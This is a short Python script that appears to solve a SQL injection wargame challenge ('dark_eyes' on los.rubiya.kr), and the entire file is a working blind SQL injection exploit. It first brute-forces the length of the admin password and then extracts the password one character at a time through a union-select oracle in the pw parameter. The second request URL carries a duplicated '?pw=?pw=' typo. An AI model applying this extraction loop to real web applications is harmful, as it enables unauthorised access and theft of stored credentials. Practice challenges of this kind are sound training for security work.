import requests
import urllib.parse
import string

cookies={'PHPSESSID': ''}

hello_admin="prob_dark_eyes"
length_pass=0
for x in range(10):
    url="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw="+ urllib.parse.quote("' or id = 'admin' and (select 1 union select(length(pw)={}))#".format(x))
    print(url)
    res = requests.get(url,cookies=cookies)
    #print(res.text)
    if hello_admin in res.text:
        print("Password Lenght is "+str(x))
        length_pass=x
print(length_pass)







pwd = ''


for i in range(1, length_pass+1):
    for j in range(48, 122):
        url="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=?pw=" +urllib.parse.quote("' or id='admin' and (select 1 union select(ord(mid(pw,{},1))={}))#".format(str(i),j)) #substring(pw,1,1)=0
        print(url)
        req = requests.get(url, cookies=cookies)
        #print(pwd)
        if hello_admin in req.text:
            print(pwd)
            pwd += chr(j)
            break

print(pwd)
